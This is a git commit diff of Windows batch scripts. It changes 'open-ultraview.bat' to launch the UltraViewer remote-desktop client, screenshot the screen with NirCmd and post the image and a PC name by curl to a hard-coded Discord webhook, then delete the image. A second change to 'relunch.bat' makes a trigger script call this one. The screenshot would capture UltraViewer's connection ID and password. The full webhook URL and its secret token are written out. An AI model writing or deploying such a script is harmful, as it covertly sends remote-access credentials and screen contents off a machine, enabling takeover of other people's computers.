18f8e1c97a09ce759a4ec13098ac5776175750ac
DThang200 <thangdao202@gmail.com>
2025-04-02 02:51:40 +0700

    update

--- asset/open-ultraview.bat
+++ asset/open-ultraview.bat
@@ -1,14 +1,39 @@
 @echo off
-:: Mở UltraViewer từ thư mục C:\Program Files (x86)\UltraViewer
+setlocal enableextensions enabledelayedexpansion
+
+cd %USERPROFILE%\Desktop\dow-code\test-something\asset
+
+set "filePath=%USERPROFILE%\Desktop\dow-code\Buoc3-Dat-ten-PC.txt"
+
+set "firstLine="
+for /f "usebackq delims=" %%a in ("%filePath%") do (
+    set "firstLine=%%a"
+    goto :break
+)
+:break
+
+:: URL webhook Discord của bạn
+set WEBHOOK_URL=https://discord.com/api/webhooks/1356349218574565476/TZDYxbBlLTPJ1Sx-fafa4qbecW0xYAJn22F0O6Yvy5KF8k1jQerLnG4nwgZTSVBDmJrF
+set SCREENSHOT_PATH=%~dp0screenshot.png
+
+:: Chụp màn hình bằng NirCmd và lưu với tên screenshot.png
+
+
 start "" "C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe"
 
 timeout /t 10 >nul
 
-cd %USERPROFILE%\Desktop\dow-code\test-something\asset
-
 nircmd.exe win -top ititle "UltraViewer"
 
+timeout /t 2 >nul
 
-:: Thông báo đã mở UltraViewer thành công
-echo Đã mở UltraViewer thành công!
+nircmd.exe savescreenshot "%SCREENSHOT_PATH%"
+:: Gửi ảnh lên webhook bằng curl
+curl -X POST "%WEBHOOK_URL%" -H "Content-Type: multipart/form-data" ^
+    -F "file=@%SCREENSHOT_PATH%" -F "payload_json={\"content\":\"%firstLine%\"}"
+
+:: Xóa ảnh sau khi gửi
+del "%SCREENSHOT_PATH%"
+
+echo Đã gửi ảnh lên Discord thành công!
 exit
--- relunch.bat
+++ relunch.bat
@@ -1,9 +1,9 @@
 @echo off 
  
-call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "CAPTURE-02/04/2025-02:47" 
+call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "CHECKING-02/04/2025-02:51" 
 if %errorlevel% equ 0 ( 
 echo done 
 ) else ( 
-call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "CAPTURE-02/04/2025-02:47" 
-    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\capture.bat" 
+call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "CHECKING-02/04/2025-02:51" 
+    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\open-ultraview.bat" 
 ) 
